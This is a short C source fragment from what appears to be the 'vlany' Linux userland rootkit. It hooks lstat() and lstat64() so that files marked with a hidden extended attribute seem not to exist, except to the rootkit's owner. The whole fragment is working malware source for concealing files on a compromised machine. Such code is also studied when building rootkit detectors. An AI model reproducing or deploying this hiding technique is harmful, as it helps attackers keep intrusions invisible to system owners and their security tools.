int lstat(const char *pathname, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] lstat() called\n");
    #endif

    HOOK(old_lxstat, C__LXSTAT);

    if(owned()) return old_lxstat(_STAT_VER, pathname, buf);

    if(hidden_xattr(pathname) || hidden_lxattr(pathname)) { errno = ENOENT; return -1; }

    return old_lxstat(_STAT_VER, pathname, buf);
}

int lstat64(const char *pathname, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] lstat64() called\n");
    #endif

    HOOK(old_lxstat64, C__LXSTAT64);

    if(owned()) return old_lxstat64(_STAT_VER, pathname, buf);

    if(hidden_xattr(pathname) || hidden_lxattr(pathname)) { errno = ENOENT; return -1; }

    return old_lxstat64(_STAT_VER, pathname, buf);
}
